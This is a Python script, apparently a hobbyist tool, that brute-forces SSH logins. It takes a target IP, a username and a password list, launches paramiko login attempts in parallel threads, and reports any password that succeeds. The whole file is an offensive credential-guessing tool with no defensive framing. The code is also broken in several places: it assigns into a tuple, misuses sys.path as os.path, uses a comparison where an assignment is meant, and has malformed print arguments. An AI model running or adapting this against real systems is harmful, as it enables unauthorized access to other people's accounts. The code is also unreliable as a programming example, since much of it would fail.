from sys import path  # used for accessing and using the inputted file
from threading import Thread  # used try many passwords simultaneously
from time import sleep  # allows to introduce a delay in the execution of the program
from paramiko import SSHClient, AutoAddPolicy  # Creates an SSH connection, and generates a security policy
from termcolor import colored  # adds color to outputs
from portScanner import checkIP  # checks target machine IP

stop_flag = 0


# Initialises and creates SSH Connection
def sshConnection(host, port, username, password):
    global stop_flag
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=username, password=password)
    except:
        pass
    else:
        stop_flag = 1
        return print(
            colored('[+] Found Password: ', 'green') +
            colored(password, 'yellow') +
            colored((', For Account: ' + username), 'yellow')), True
    finally:
        ssh.close()


if __name__ == '__main__':
    try:
        the_right_input = False, False, False, False
        while not the_right_input[0]:  # Keep repeating the question until user inputs are valid
            host_ip = input('[+] Target IP Address: ').strip(' ')
            # for every ip address in the inputted targets target
            if checkIP(host_ip)[0] == host_ip or host_ip.lower() == 'localhost':
                # check if its a valid ip
                ans = input("Is " + host_ip + " correct?")
                if 'y' in ans:
                    the_right_input[1] = True
                else:
                    pass
            else:  # if not print the error and ask the question again
                print(host_ip + ' not an ip address')

        while not the_right_input[1]:
            username = str(input('[+] Enter SSH Username: '))
            if len(username) > 0:
                ans = input("Is " + username + " correct?")
                if 'y' in ans:
                    the_right_input[1] = True
                else:
                    pass

        while not the_right_input[2]:
            input_file = str(input('[+] Password File: '))
            if not path.isfile(input_file):
                print(colored('File not found Try again', 'red'))
            else:
                the_right_input[2] = True
        while not the_right_input[3]:
            port = str(input('[+] Input SSH Port NOTE: default is 22').strip(' '))
            if port.isdigit():
                the_right_input == True
            else:
                print(colored('Invalid Entry', 'red'))

        print(colored('* * * Starting SSH Bruteforce on ', 'green') + host_ip, +
        colored('With Account: ', 'green') + username, + colored('* * *', 'green')
              )

        with open(input_file, 'r') as file:
            for line in file.readlines():
                if stop_flag == 1:
                    t.join()
                    exit()
                password = line.strip()
                t = Thread(target=sshConnection, args=(host_ip, port, username, password,))
                t.start()
                sleep(0.5)

            if stop_flag == 0:
                print('Password not found')
    except KeyboardInterrupt:
        print('bye')
        exit(0)
